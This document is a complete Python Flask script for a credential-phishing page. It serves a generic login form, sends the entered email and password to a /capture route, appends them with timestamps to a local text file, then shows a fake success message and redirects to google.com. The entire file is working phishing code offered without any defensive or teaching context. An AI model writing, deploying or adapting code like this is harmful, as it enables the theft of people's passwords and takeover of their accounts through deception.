from flask import Flask, request, render_template_string
from datetime import datetime

app = Flask(__name__)

html_page = """
<!DOCTYPE html>
<html>
<head><title>Sign In</title><style>body{font-family:sans-serif;background-color:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}.card{background:white;padding:25px;border-radius:8px;box-shadow:0 4px 10px rgba(0,0,0,0.1);width:300px;text-align:center;}input{width:90%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:5px;}button{width:98%;padding:12px;background-color:#007bff;color:white;border:none;border-radius:5px;cursor:pointer;font-weight:bold;}</style></head>
<body><div class="card"><h2>Login</h2><input type="text" id="u" placeholder="Email"><input type="password" id="p" placeholder="Password"><button onclick="s()">Log In</button></div>
<script>function s(){var u=document.getElementById('u').value;var p=document.getElementById('p').value;window.location.href="/capture?user="+u+"&pass="+p;}</script></body></html>
"""

@app.route('/')
def home(): return render_template_string(html_page)

@app.route('/capture')
def capture():
    u = request.args.get('user')
    p = request.args.get('pass')
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # This saves it much more neatly
    with open("final_results.txt", "a") as f:
        f.write(f"[{time}] EMAIL: {u} | PASSWORD: {p}\\n")
        
    return "<h3>Login Successful. Redirecting...</h3><script>setTimeout(function(){window.location.href='https://google.com';},1500);</script>"

if __name__ == '__main__': app.run(host='0.0.0.0', port=5000)
